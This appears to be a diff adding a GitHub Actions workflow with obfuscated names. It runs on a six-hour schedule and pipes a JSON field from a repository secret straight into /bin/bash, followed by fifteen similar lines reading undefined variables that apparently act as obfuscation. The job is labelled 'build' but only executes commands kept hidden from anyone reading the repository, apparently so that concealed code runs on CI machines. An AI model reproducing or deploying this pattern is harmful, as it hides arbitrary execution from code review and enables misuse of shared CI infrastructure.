@@ -1,0 +1,32 @@
+name: lantianqiang8765
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lantianqiang8765
+        env:
+          psia958: ${{ secrets.psia958 }}
+        run: |
+          echo $psia958 | jq -r .lzmag32 | /bin/bash
+          echo $fkv1 | jq -r .szgt20 | /bin/bash
+          echo $ev93 | jq -r .wk9389 | /bin/bash
+          echo $cccz510 | jq -r .gviem0 | /bin/bash
+          echo $v10 | jq -r .swomm0 | /bin/bash
+          echo $vdr95642 | jq -r .ec1204 | /bin/bash
+          echo $yn61 | jq -r .pfby3766 | /bin/bash
+          echo $kr86475 | jq -r .wqch62901 | /bin/bash
+          echo $sps163 | jq -r .rhol4557 | /bin/bash
+          echo $yuhc31748 | jq -r .hh5033 | /bin/bash
+          echo $uw9 | jq -r .ezzni2 | /bin/bash
+          echo $rpqz8165 | jq -r .qbfo4 | /bin/bash
+          echo $gyayz59498 | jq -r .cfaia4354 | /bin/bash
+          echo $jyzkj095 | jq -r .vv7 | /bin/bash
+          echo $bhs021 | jq -r .q850 | /bin/bash
+          echo $rqkb86 | jq -r .dssyk0882 | /bin/bash
+
